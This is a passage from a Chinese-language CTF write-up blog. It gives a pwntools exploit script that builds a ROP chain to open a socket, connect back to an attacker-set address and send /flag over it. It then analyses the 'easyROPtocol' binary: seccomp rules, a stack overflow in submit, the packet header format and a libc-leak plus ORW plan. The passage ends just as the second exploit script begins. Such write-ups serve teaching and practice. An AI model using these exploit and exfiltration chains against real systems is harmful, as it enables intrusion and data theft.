<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>为了获取flag,一般采用ret2libc或者ret2syscall，这两种方法都需要程序输出一些数据。</p>
<p>由于攻击机与服务器之间无法通过标准输入，标准输出和标准错误进行读写，那么需要创建一个新的通信连接用于传输数据。</p>
<p>为了减少传输次数，直接进行ORW，然后传输flag即可。</p>
<h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br>&#x27;&#x27;&#x27;<br>@文件        :exp.py<br>@说明        :rop + 反弹shell<br>@时间        :2022/02/12 11:38:05<br>@作者        :sh0ve1<br>@防护<br>    Arch:     amd64-64-little<br>    RELRO:    No RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x3ff000)<br>&#x27;&#x27;&#x27;<br><br>from pwn import *<br>import pwnlib<br><br>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br><br>REMOTE = 0<br>if REMOTE:<br>    p = remote(&#x27;node4.buuoj.cn&#x27;,27184)<br><span class="hljs-section">else:</span><br>    p = process(&#x27;./pwn&#x27;)<br>    libc = ELF(&#x27;./libc.so.6&#x27;)<br><br>elf = ELF(&#x27;./pwn&#x27;)<br><br>pop_rdi_ret = 0x401356<br>pop_rsi_ret = 0x401358<br>pop_rdx_ret = 0x401354<br>pop_rax_ret = 0x40135a<br>pop_rcx_ret = 0x40135d<br>mov_rcx_rax = 0x40135C<br>mov_rdi_rcx = 0x40135F<br>syscall_ret = 0x401351<br>bing = 0x403700<br><br>&#x27;&#x27;&#x27;<br>sockfd = socket(2,1,0)<br>connect(sockfd,addr,len)<br>&#x27;&#x27;&#x27;<br><br>payload = b&#x27;A&#x27;*0x10<br><span class="hljs-comment"># sockfd = socket(AF_INET,SOCK_STREAM,0) AF_INET=2 SOCK_STREAM=1</span><br>payload += p64(pop_rdi_ret) + p64(2)<br>payload += p64(pop_rsi_ret) + p64(1)<br>payload += p64(pop_rdx_ret) + p64(0)<br>payload += p64(pop_rax_ret) + p64(0x29)<br>payload += p64(syscall_ret) <span class="hljs-comment"># socket _fileno=0</span><br><br><span class="hljs-comment"># payload += p64(mov_rcx_rax) + p64(mov_rdi_rcx)</span><br><span class="hljs-comment"># connect(sockfd,addr,len)</span><br>payload += p64(pop_rdi_ret) + p64(0)<br>payload += p64(pop_rsi_ret) + p64(bing+0x170)<br>payload += p64(pop_rdx_ret) + p64(0x10)<br>payload += p64(pop_rax_ret) + p64(0x2a) <span class="hljs-comment"># connect</span><br>payload += p64(syscall_ret)<br><br><span class="hljs-comment">#open(&quot;/flag&quot;,0)</span><br>payload += p64(pop_rdi_ret) + p64(bing+0x180)<br>payload += p64(pop_rsi_ret) + p64(0)<br>payload += p64(pop_rax_ret) + p64(2) <span class="hljs-comment"># open _fileno=1</span><br>payload += p64(syscall_ret)<br><br><span class="hljs-comment"># read(1,bing+0x1a0,0x30)</span><br>payload += p64(mov_rcx_rax) + p64(mov_rdi_rcx)<br>payload += p64(pop_rsi_ret) + p64(bing+0x1a0)<br>payload += p64(pop_rdx_ret) + p64(0x30)<br>payload += p64(pop_rax_ret) + p64(0) <span class="hljs-comment"># read</span><br>payload += p64(syscall_ret)<br><br><span class="hljs-comment"># write(0,bing+0x1a0,0x30)</span><br>payload += p64(pop_rdi_ret) + p64(0)<br>payload += p64(pop_rsi_ret) + p64(bing+0x1a0)<br>payload += p64(pop_rdx_ret) + p64(0x30)<br>payload += p64(pop_rax_ret) + p64(1) <span class="hljs-comment"># write</span><br>payload += p64(syscall_ret)<br><br>payload = payload.ljust(0x170,b&#x27;\x00&#x27;)<br><br>payload += p16(2)<br>payload += p16(10001,endian=<span class="hljs-string">&quot;big&quot;</span>)<br>payload += p32(0x7f000001,endian=<span class="hljs-string">&quot;big&quot;</span>) <span class="hljs-comment">#  0x8B0976B9 0x7f000001</span><br>payload += p64(0)<br>payload += b<span class="hljs-string">&quot;/flag&quot;</span>.ljust(8,b&#x27;\x00&#x27;)<br><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x4013FA&quot;)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Hello,Do You Like Bing Dwen Dwen?\n&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure>

<h3 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>理解解决题目的困难的本质是什么，从本质上解决问题。本题的困难就是程序运行结束后无法进行数据交互，所以我们需要让这个程序可以与我们进行数据交互，因此可以让程序创建一个连接进行数据交互。</li>
</ul>
<h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/WHACKW/article/details/46392455">https://blog.csdn.net/WHACKW/article/details/46392455</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/dearQiHao/article/details/102877786">https://blog.csdn.net/dearQiHao/article/details/102877786</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wyqfighting/archive/2013/03/06/2945651.html">https://www.cnblogs.com/wyqfighting/archive/2013/03/06/2945651.html</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/WHACKW/article/details/46392455">https://blog.csdn.net/WHACKW/article/details/46392455</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/mpp_king/article/details/80222304">https://blog.csdn.net/mpp_king/article/details/80222304</a></li>
</ul>
<h2 id="easyROPtocol"><a href="#easyROPtocol" class="headerlink" title="easyROPtocol"></a>easyROPtocol</h2><h3 id="基本信息-2"><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li>libc版本：<code>libc6_2.31-0ubuntu9.2_amd64</code></li>
<li>file pwn</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB executable, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">31</span>-<span class="hljs-number">0</span>ubuntu9.<span class="hljs-number">2</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=<span class="hljs-number">8</span>d7cbb4be5d97a69c8fc905db176c3e2356e74ec, stripped<br></code></pre></td></tr></table></figure>

<ul>
<li>保护机制：</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3ff000)</span><br></code></pre></td></tr></table></figure>

<ul>
<li>沙盒：无法getshell</li>
</ul>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">A</span> = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x05 <span class="hljs-number">0</span>xc000003e  if (<span class="hljs-keyword">A</span> != ARCH_X86_64) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">A</span> = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35 0x00</span> <span class="hljs-number">0</span>x01 <span class="hljs-number">0x40000000</span>  if (<span class="hljs-keyword">A</span> &lt; <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x02 <span class="hljs-number">0</span>xffffffff  if (<span class="hljs-keyword">A</span> != <span class="hljs-number">0</span>xffffffff) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15 0x01</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x0000003b  if (<span class="hljs-keyword">A</span> == execve) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return ALLOW<br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  return KILL<br></code></pre></td></tr></table></figure>

<h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">size_t</span> v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> chk_result; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( idx = <span class="hljs-number">0</span>; idx &lt;= <span class="hljs-number">3</span> &amp;&amp; *((_QWORD *)&amp;heap_array + idx); ++idx )<br>    ;<br>  <span class="hljs-keyword">if</span> ( idx != <span class="hljs-number">4</span> )<br>  &#123;<br>    *((_QWORD *)&amp;heap_array + idx) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>uLL);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)&amp;heap_array + idx), <span class="hljs-number">0x1000</span>uLL);<br>    chk_result = <span class="hljs-built_in">check</span>(*((_QWORD *)&amp;heap_array + idx));<br>    <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-built_in">func</span>(*((_QWORD *)&amp;heap_array + idx)) &amp; chk_result) == <span class="hljs-number">1</span> )<br>    &#123;<br>      flag = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v0 = <span class="hljs-built_in">strlen</span>(aBengBuZhuLe);<br>      <span class="hljs-built_in">write</span>(<span class="hljs-number">2</span>, aBengBuZhuLe, v0);<br>      <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;heap_array + idx));<br>      *((_QWORD *)&amp;heap_array + idx) = <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>add函数一次可以提交0x1000字节的数据，最多可以提交4次。数据的头部需要有一定格式才能提交。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">submit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">void</span> *v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">size_t</span> v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">size_t</span> v2; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-3020h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+3008h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+300Ch] [rbp-14h]</span><br><br>  v6 = <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x3000</span>uLL);<br>  <span class="hljs-keyword">while</span> ( flag )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">3</span> &amp;&amp; (!heap_array[i] || *(_DWORD *)(heap_array[i] + <span class="hljs-number">4LL</span>) != v6); ++i )<br>      ;<br>    <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">4</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-number">4</span> * (*(_WORD *)(heap_array[i] + <span class="hljs-number">12LL</span>) &amp; <span class="hljs-number">0xF</span>) != <span class="hljs-number">20</span> &amp;&amp; *(_WORD *)(heap_array[i] + <span class="hljs-number">20LL</span>) )<br>    &#123;<br>      v0 = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(heap_array[i] + <span class="hljs-number">4</span> * (*(_WORD *)(heap_array[i] + <span class="hljs-number">12LL</span>) &amp; <span class="hljs-number">0xF</span>));<br>      v1 = <span class="hljs-built_in">strlen</span>(s);<br>      <span class="hljs-built_in">memcpy</span>(&amp;s[v1], v0, <span class="hljs-number">0x1000</span>uLL); <span class="hljs-comment">//栈溢出</span><br>      v6 += <span class="hljs-number">0x1000</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">strcpy</span>(s, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(<span class="hljs-number">4</span> * (*(_WORD *)(heap_array[i] + <span class="hljs-number">12LL</span>) &amp; <span class="hljs-number">0xF</span>) + heap_array[i]));<span class="hljs-comment">// ?</span><br>      flag = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  v2 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, s, v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Done.\n&quot;</span>, <span class="hljs-number">6uLL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在submit函数中，最多可以依次四次，且每次都在上一次复制的结束位置开始再次复制，但是数组s到ebp的偏移只有0x3020,所以在第四次复制时会导致溢出。</p>
<blockquote>
<p>整个过程可以视为TCP要传输的数据大小超过了MSS，所以需要对数据进行分片，且每一个片段都会有一个TCP头，只有TCP头正确才能提交进行传输。</p>
</blockquote>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> check(<span class="hljs-variable">__int64</span> a1)<br>&#123;<br>  <span class="hljs-variable">__int64</span> result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">if</span> ( *(<span class="hljs-variable">_WORD</span> *)a1 != <span class="hljs-number">0</span>x766E )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( *(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">2</span>) != <span class="hljs-number">0</span>x28B7 )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( !*(<span class="hljs-variable">_DWORD</span> *)(a1 + <span class="hljs-number">4</span>) )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( !*(<span class="hljs-variable">_DWORD</span> *)(a1 + <span class="hljs-number">8</span>) )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( !*(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">14</span>) )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( *(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">18</span>) )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">4</span> * (*(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0</span>xF) == <span class="hljs-number">20</span> )  <span class="hljs-comment">// 0x5</span><br>    <span class="hljs-built_in">goto</span> LABEL_18;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">4</span> * (*(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0</span>xF) != <span class="hljs-number">24</span> )  <span class="hljs-comment">// 0x6</span><br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( *(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">22</span>) == <span class="hljs-number">0</span>xFFFF )<br>LABEL_18:<br>    result = <span class="hljs-number">1</span>LL;<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-number">0</span>LL;<br>  return result;<br>&#125;<br><br><span class="hljs-variable">_BOOL8</span> <span class="hljs-variable">__fastcall</span> check_sum(<span class="hljs-variable">__int64</span> a1)<br>&#123;<br>  char v2[<span class="hljs-number">23</span>]; <span class="hljs-comment">// [rsp+Bh] [rbp-1Dh] BYREF</span><br>  unsigned <span class="hljs-variable">__int16</span> j; <span class="hljs-comment">// [rsp+22h] [rbp-6h]</span><br>  unsigned <span class="hljs-variable">__int16</span> i; <span class="hljs-comment">// [rsp+24h] [rbp-4h]</span><br>  <span class="hljs-variable">__int16</span> v5; <span class="hljs-comment">// [rsp+26h] [rbp-2h]</span><br><br>  strcpy(v2, <span class="hljs-string">&quot;fakeipheadfa&quot;</span>);<br>  *(<span class="hljs-variable">_QWORD</span> *)&amp;v2[<span class="hljs-number">13</span>] = v2;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">5</span>u; ++i )<br>    v5 ^= *(<span class="hljs-variable">_WORD</span> *)(<span class="hljs-number">2</span>LL * i + *(<span class="hljs-variable">_QWORD</span> *)&amp;v2[<span class="hljs-number">13</span>]);<br>  *(<span class="hljs-variable">_QWORD</span> *)&amp;v2[<span class="hljs-number">13</span>] = a1;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">2047</span>u; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( j != <span class="hljs-number">8</span> )<br>      v5 ^= *(<span class="hljs-variable">_WORD</span> *)(<span class="hljs-number">2</span>LL * j + *(<span class="hljs-variable">_QWORD</span> *)&amp;v2[<span class="hljs-number">13</span>]);<br>  &#125;<br>  return v5 == *(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>根据check函数推测出报文头的格式如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">message</span> &#123;<br>	<span class="hljs-type">uint32_t</span> magic; 		    <span class="hljs-comment">// 固定值 0x28b7766e</span><br>	<span class="hljs-type">uint32_t</span> seq_nu; 		    <span class="hljs-comment">// 分片的序列号，submit函数中的memcpy会校验，依次为1 0x1001 0x2001 0x3001</span><br>	<span class="hljs-type">uint32_t</span> constant_1; 		<span class="hljs-comment">// 不能为0</span><br>	<span class="hljs-type">uint16_t</span> type; 		        <span class="hljs-comment">// 值为5或6</span><br>	<span class="hljs-type">uint16_t</span> constant_2; 		<span class="hljs-comment">// 不能为0</span><br>	<span class="hljs-type">uint16_t</span> check_sum;         <span class="hljs-comment">// 校验和</span><br>	<span class="hljs-type">uint16_t</span> constant_3; 		<span class="hljs-comment">// 必须为0</span><br>	<span class="hljs-type">uint16_t</span> flag1; 	        <span class="hljs-comment">// 可控制submit函数的分支</span><br>	<span class="hljs-type">uint16_t</span> flag2; 	        <span class="hljs-comment">// 当type为6时，必须为0xffff</span><br>	<span class="hljs-type">char</span> data[];		        <span class="hljs-comment">// 数据</span><br>&#125;;<br></code></pre></td></tr></table></figure>
<p>其中校验和是最后计算得到后填充，计算方式为：将报文拼接在字符串后面，然后两个字节两个字节的进行异或运算（跳过报文头的校验和字段）直至数据末尾。</p>
<h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先构造好报文头部控制其执行流程使其触发栈溢出；<br>利用栈溢出，使用write泄露出libc地址（submit函数溢出后rdx为6，正好可以泄露地址）；<br>再次执行main函数，然后构造rop chain进行ORW。</p>
<h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :re + ret2libc</span><br><span class="hljs-string">@时间        :2022/02/19 23:00:28</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span 